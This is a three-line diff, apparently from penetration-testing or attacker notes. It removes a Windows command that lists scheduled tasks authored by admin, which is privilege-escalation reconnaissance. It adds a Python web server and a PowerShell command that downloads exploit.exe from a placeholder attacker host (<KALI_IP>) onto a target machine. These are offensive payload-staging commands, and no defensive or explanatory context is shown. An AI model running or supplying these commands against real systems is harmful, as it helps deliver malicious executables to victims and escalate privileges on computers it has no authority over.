@@ -1,1 +1,2 @@
-schtasks /query /fo LIST /v | findstr /C:"TaskName" /C:"Author" | findstr /C:"admin"
+python3 -m http.server 8000
+powershell -c "Invoke-WebRequest -Uri http://<KALI_IP>:8000/exploit.exe -OutFile exploit.exe"
